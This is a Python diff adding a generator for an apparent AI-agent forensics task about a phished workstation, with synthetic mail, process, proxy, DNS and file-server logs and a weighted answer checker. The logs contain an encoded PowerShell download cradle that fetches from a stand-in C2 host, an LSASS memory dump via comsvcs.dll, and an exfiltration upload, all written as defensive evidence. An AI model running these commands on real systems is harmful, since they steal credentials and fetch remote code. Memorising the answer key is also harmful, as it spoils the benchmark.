@@ -297,3 +297,123 @@ def intrusion_case(root: Path, seed: int):
 
     goal = "Investigate the two-host incident. Submit a JSON object with attacker_ip, initial_access, webshell, privilege_escalation, lateral_account, exfiltration, sensitive_file, timeline, and remediation."
     return goal, checker
+
+
+def phishing_case(root: Path, seed: int):
+    """Build a phished-workstation incident (CASE-003) and return its goal and weighted checker.
+
+    The C2 domain never appears in clear next to the beacons: it is only in the encoded
+    PowerShell command and in DNS, so the agent must decode or correlate. Decoys: a
+    quarantined phishing mail to another user and an hourly updater in the proxy log.
+    """
+    rng = random.Random(f"{seed}:CASE-003")
+    users = ["mlopez", "jchen", "apatel", "rkim", "tnguyen"]
+    victim = rng.choice(users)
+    decoy_user = rng.choice([user for user in users if user != victim])
+    attachment = f"invoice_{rng.randint(1000, 9999)}.docm"
+    decoy_attachment = f"payment_{rng.randint(1000, 9999)}.docm"
+    c2_domain = f"{rng.choice(['cdn-telemetry', 'sync-metrics', 'edge-stat'])}{rng.randint(10, 99)}.example.invalid"
+    c2_ip = f"203.0.113.{rng.randint(20, 230)}"
+    updater_ip = f"198.51.100.{rng.randint(20, 230)}"
+    interval = rng.choice([120, 180, 240, 300])
+    account = rng.choice(["svc-backup", "svc-sql", "svc-deploy"])
+    archive = f"stage{rng.randint(10, 99)}.7z"
+    upload_host = f"files-{rng.randint(10, 99)}.example.invalid"
+    command = f"IEX (New-Object Net.WebClient).DownloadString('http://{c2_domain}/a')"
+    encoded = base64.b64encode(command.encode("utf-16-le")).decode()
+
+    put(root / "README.md", "CASE-003 — Phished workstation\nInvestigate mail/, ws17/ and fs02/. All timestamps are UTC on "
+        "2026-05-12. Submit one JSON object with victim_user, phishing_attachment, c2_domain, "
+        "beacon_interval_seconds, credential_access, lateral_account, staged_archive, timeline, and remediation.\n"
+        "Do not invent facts that the evidence does not support.\n")
+    put(root / "mail" / "gateway.log", "\n".join([
+        f"09:02:11 DELIVER from=billing@supplier.example.invalid to={decoy_user}@corp.example.invalid attachment=statement.pdf verdict=clean",
+        f"09:09:40 QUARANTINE from=accounts@paymnt-notice.invalid to={decoy_user}@corp.example.invalid attachment={decoy_attachment} verdict=malicious",
+        f"09:14:05 DELIVER from=ap@supp1ier.example.invalid to={victim}@corp.example.invalid attachment={attachment} verdict=clean",
+        "09:30:00 DELIVER from=news@intranet.example.invalid to=all@corp.example.invalid attachment=none verdict=clean",
+    ]) + "\n")
+    put(root / "ws17" / "process.log", "\n".join([
+        "09:00:03 user=SYSTEM pid=704 lsass.exe",
+        f"09:05:12 user={victim} pid=3980 chrome.exe",
+        f'09:21:07 user={victim} pid=4410 WINWORD.EXE "C:\\Users\\{victim}\\Downloads\\{attachment}"',
+        f"09:21:12 user={victim} pid=4432 parent=4410 powershell.exe -nop -w hidden -enc {encoded}",
+        f"09:40:55 user={victim} pid=4710 Teams.exe",
+        f"10:05:41 user={victim} pid=5120 parent=4432 rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 C:\\ProgramData\\l.dmp full",
+        f"10:09:58 user={victim} pid=5188 parent=4432 net.exe use \\\\FS-02\\Finance /user:CORP\\{account}",
+    ]) + "\n")
+    proxy = []
+    for index in range(int(80 * 60 / interval)):
+        moment = datetime(2026, 5, 12, 9, 22, tzinfo=timezone.utc) + timedelta(seconds=index * interval)
+        proxy.append((moment, f"{moment:%H:%M:%S} WS-17 CONNECT {c2_ip}:443 bytes=412"))
+    for hour in (9, 10):
+        moment = datetime(2026, 5, 12, hour, 0, 30, tzinfo=timezone.utc)
+        proxy.append((moment, f"{moment:%H:%M:%S} WS-17 GET http://updates.example.invalid/check ({updater_ip}) bytes=2048"))
+    sites = ["docs.example.invalid", "wiki.example.invalid", "news.example.invalid", "cdn.example.invalid"]
+    for index in range(320):
+        moment = datetime(2026, 5, 12, 9, 0, tzinfo=timezone.utc) + timedelta(seconds=rng.randrange(0, 6000))
+        proxy.append((moment, f"{moment:%H:%M:%S} WS-17 GET https://{rng.choice(sites)}/p/{index} bytes={rng.randrange(800, 90000)}"))
+    put(root / "ws17" / "proxy.log", "\n".join(line for _, line in sorted(proxy)) + "\n")
+    put(root / "ws17" / "dns.log", "\n".join([
+        "09:00:29 WS-17 query updates.example.invalid A " + updater_ip,
+        f"09:05:13 WS-17 query docs.example.invalid A 192.0.2.{rng.randint(20, 230)}",
+        f"09:21:13 WS-17 query {c2_domain} A {c2_ip}",
+        f"09:40:56 WS-17 query teams.example.invalid A 192.0.2.{rng.randint(20, 230)}",
+    ]) + "\n")
+    put(root / "fs02" / "security.log", "\n".join([
+        "02:00:04 EventID=4624 LogonType=3 Account=svc-monitor Source=10.0.0.5",
+        f"10:11:02 EventID=4624 LogonType=3 Account={account} Source=WS-17",
+        "11:30:10 EventID=4624 LogonType=3 Account=svc-monitor Source=10.0.0.5",
+    ]) + "\n")
+    put(root / "fs02" / "file_audit.log", "\n".join(
+        [f"10:{13 + index}:0{index} {account} read \\\\FS-02\\Finance\\{name}"
+         for index, name in enumerate(["payroll-2026.xlsx", "vendors.xlsx", "q1-forecast.xlsx", "bank-details.xlsx"])]
+        + [f"10:20:44 {account} create C:\\ProgramData\\Packages\\{archive}",
+           "11:30:12 svc-monitor read \\\\FS-02\\Health\\status.txt"]) + "\n")
+    put(root / "fs02" / "net.log", f"10:26:30 {account} POST https://{upload_host}/upload file={archive} bytes=48211337\n"
+        "11:30:15 svc-monitor GET https://monitor.example.invalid/ping bytes=120\n")
+
+    def checker(answer: str):
+        import re
+        try:
+            value = json.loads(answer)
+        except json.JSONDecodeError:
+            match = re.search(r"\{.*\}", answer, re.S)
+            try: value = json.loads(match.group(0)) if match else {}
+            except json.JSONDecodeError: value = {}
+        if not isinstance(value, dict): value = {}
+        lower = json.dumps(value, sort_keys=True).lower()
+
+        def seconds_value(raw) -> float | None:
+            if isinstance(raw, (int, float)) and not isinstance(raw, bool):
+                return float(raw)
+            found = re.search(r"\d+(?:\.\d+)?", str(raw or ""))
+            if not found:
+                return None
+            number = float(found.group(0))
+            return number * 60 if "min" in str(raw).lower() else number
+
+        user = str(value.get("victim_user", "")).lower().split("\\")[-1].split("@")[0].strip()
+        sent = str(value.get("phishing_attachment", "")).lower()
+        beacon = seconds_value(value.get("beacon_interval_seconds"))
+        dimensions = {
+            "victim_user": user == victim,
+            "phishing_attachment": attachment in sent and decoy_attachment not in sent,
+            "c2_domain": c2_domain in str(value.get("c2_domain", "")).lower(),
+            "beacon_interval": beacon is not None and abs(beacon - interval) <= 5,
+            "credential_access": "lsass" in lower and any(x in lower for x in ("dump", "minidump", "comsvcs")),
+            "lateral_account": str(value.get("lateral_account", "")).lower().split("\\")[-1] == account,
+            "staged_archive": archive in str(value.get("staged_archive", "")).lower(),
+            "timeline": sum(x in lower for x in ("09:14", "09:21", "09:22", "10:05", "10:11", "10:20", "10:26")) >= 4,
+            "remediation": sum(x in lower for x in ("isolate", "reset", "rotate", "block", "remove", "revoke",
+                                                   "reimage", "quarantine", "disable")) >= 3,
+        }
+        weights = {"victim_user": 1, "phishing_attachment": 1, "c2_domain": 2, "beacon_interval": 1,
+                   "credential_access": 1, "lateral_account": 1, "staged_archive": 1, "timeline": 1,
+                   "remediation": 1}
+        score = sum(weights[key] for key, passed in dimensions.items() if passed)
+        return score >= 8, {"score": score, "max_score": 10, "dimensions": dimensions}
+
+    goal = ("Investigate the phished-workstation incident across mail/, ws17/ and fs02/. Submit a JSON object with "
+            "victim_user, phishing_attachment, c2_domain, beacon_interval_seconds, credential_access, "
+            "lateral_account, staged_archive, timeline, and remediation.")
+    return goal, checker
